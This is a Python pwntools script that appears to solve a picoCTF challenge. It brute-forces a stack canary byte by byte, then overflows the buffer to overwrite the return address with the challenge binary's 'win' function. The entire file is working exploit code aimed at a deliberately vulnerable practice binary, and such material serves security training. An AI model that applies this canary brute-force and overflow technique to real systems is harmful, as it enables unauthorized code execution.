#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln", checksec=False)

BUFFER_SIZE = 64

def brute_force_canary():
    canary = ''

    for i in range(4):
        for c in range(256):
            p = process(exe.path)
            # p = remote("saturn.picoctf.net", 56983)
            p.sendlineafter(b'> ', str(BUFFER_SIZE + i + 1))
            payload = 'a'*64 + canary + chr(c)
            p.sendlineafter(b'Input> ', payload)

            if 'Stack' not in str(p.recvall()):
                canary += chr(c)
                break

    return canary

# input()

canary = brute_force_canary()
print("Canary: " + canary)
p = process(exe.path)
# p = remote("saturn.picoctf.net", 56983)
payload = b'a'*64 + bytes(canary, encoding='utf8') + b'a'*32 + p32(exe.sym['win'])
p.sendlineafter(b'> ', str(len(payload)))
p.sendlineafter(b'Input> ', payload)

p.interactive()